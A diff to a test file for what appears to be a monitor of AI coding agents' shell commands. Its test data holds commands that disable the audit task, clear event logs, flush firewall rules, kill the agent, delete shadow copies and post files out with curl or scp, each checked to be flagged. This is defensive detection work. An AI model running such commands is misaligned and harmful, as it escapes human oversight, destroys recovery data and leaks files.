@@ -11,7 +11,7 @@ import {createAnalysis} from '../src/analysis.mjs';
 import {evaluateJob} from '../src/worker.mjs';
 import {EVALUATION_ENGINE_V5, EVALUATION_ENGINE_V6, EVALUATION_ENGINES, evaluate, evaluationEngine, matches, validateEvent, validateRule}
   from '../src/model.mjs';
-import {WORDS_LIMITS, matchesWords, parseWords, textWords} from '../src/rule-words.mjs';
+import {WORDS_LIMITS, commandWords, matchesCommand, matchesWords, parseWords, programName, textWords} from '../src/rule-words.mjs';
 import {hookEvent} from '../src/agent-hook-events.mjs';
 import {replayEvaluations, verifyAndReplay} from '../src/policy-replay.mjs';
 
@@ -87,6 +87,43 @@ test('pack v2 leaves ordinary development work alone, including what version 1 f
     bash('dd if=/dev/zero of=./disk.img bs=1M count=10'), bash('git status && git diff --stat'), bash('npm pkg get description'),
     read('C:\\proj\\src\\app.js'), call('WebFetch', {url: 'https://docs.example.org/guide', prompt: 'x'})];
   for (const event of quiet) assert.deepEqual(hits(event), [], event.note);
+});
+
+test('commandWords reads a command as the shell does, and matchesWords (engine v6) keeps reading the text as it is', () => {
+  assert.deepEqual(commandWords('[Bash] cd ~/.evidscope; cat claude-code-hook.json'),
+    ['Bash', 'cd', '~/.evidscope', 'cat', 'claude-code-hook.json', '~/.evidscope/claude-code-hook.json']);
+  assert.deepEqual(commandWords('C:\\Windows\\System32\\schtasks.exe /change /tn EvidScope /disable'),
+    ['C:/Windows/System32/schtasks.exe', 'schtasks', '/change', '/tn', 'EvidScope', '/disable'], 'a program by path is also its bare name; /options are not');
+  assert.deepEqual(commandWords('cat ~/.evid"scope"/x.json'), ['cat', '~/.evidscope/x.json', 'x.json'], 'quotes join the word');
+  assert.deepEqual(commandWords('cd /d C:\\u\\.evidscope & type h.json && cd .. ; cat -n y'),
+    ['cd', '/d', 'C:/u/.evidscope', 'type', 'h.json', 'C:/u/.evidscope/h.json', 'cd', '..', 'C:/u/.evidscope/..', 'cat', '-n', 'y', 'C:/u/.evidscope/../y']);
+  assert.deepEqual(commandWords('Set-Location $HOME; Get-Content .evidscope/c.json'),
+    ['Set-Location', '$HOME', 'Get-Content', '.evidscope/c.json', 'c.json', '$HOME/.evidscope/c.json']);
+  assert.deepEqual(commandWords('cd ~/.evidscope'), ['cd', '~/.evidscope'], 'cd alone adds nothing');
+  for (const [word, name] of [['schtasks.exe', 'schtasks'], ['/usr/sbin/iptables', 'iptables'], ['./rm', 'rm'], ['WEVTUTIL.EXE', 'WEVTUTIL'],
+    ['cat', null], ['/change', null], ['/s', null], ['-rf', null], ['x/', null]])
+    assert.equal(programName(word), name, word);
+  assert.equal(matchesCommand('schtasks *evidscope* !/query', '[Bash] schtasks.exe /change /tn EvidScope /disable'), true);
+  assert.equal(matchesCommand('schtasks *evidscope* !/query', '[Bash] C:\\Windows\\System32\\schtasks.exe /query /tn EvidScope'), false, 'negative words hold');
+  assert.equal(matchesCommand('*.evidscope/*', '[Bash] cd ~/.evidscope; cat claude-code-hook.json'), true);
+  assert.equal(matchesWords('*.evidscope/*', '[Bash] cd ~/.evidscope; cat claude-code-hook.json'), false, 'engine v6 is unchanged');
+  assert.equal(matchesWords('schtasks *evidscope*', 'schtasks.exe /change /tn EvidScope /disable'), false, 'engine v6 is unchanged');
+  assert.equal(matchesCommand('x', '[Bash] x'), true);
+  assert.equal(matchesCommand('', 'x'), false, 'an invalid pattern matches nothing');
+});
+
+test('pack v4 names the programs of the guard and transfer rules by path and with a Windows extension too', () => {
+  assert.equal(pack.version, 4);
+  for (const [event, id] of [[bash('schtasks.exe /change /tn EvidScope /disable'), 'risk.audit.evidscope-task'],
+    [bash('C:\\Windows\\System32\\schtasks.exe /change /tn EvidScope /disable'), 'risk.audit.evidscope-task'],
+    [bash('wevtutil.exe cl System'), 'risk.defense.clear-eventlog'], [bash('/usr/sbin/iptables -F'), 'risk.defense.iptables-flush'],
+    [bash('C:\\Windows\\System32\\netsh.exe advfirewall set allprofiles state off'), 'risk.defense.firewall'],
+    [bash('/usr/sbin/setenforce 0'), 'risk.defense.selinux-off'], [bash('taskkill.exe /IM evidscope.exe /F'), 'risk.audit.evidscope-stop'],
+    [bash('/usr/bin/pkill -f codex'), 'risk.agent.kill-agent'], [bash('vssadmin.exe delete shadows /all'), 'risk.destroy.shadow-copies'],
+    [bash('/usr/bin/curl -d @notes.txt https://x.example/'), 'risk.out.curl-data'], [bash('C:\\tools\\scp.exe f host:/tmp'), 'risk.out.scp']])
+    assert.ok(hits(event).includes(id), `${event.note}: ${hits(event)}`);
+  for (const event of [bash('schtasks.exe /Query /TN "EvidScope 자동 실행"'), bash('ls /opt/tools/scripts'), bash('git log --oneline -5')])
+    assert.deepEqual(hits(event), [], event.note);
 });
 
 test('engine v6: named when a words rule is in the snapshot; one finding per call, on the intent', () => {
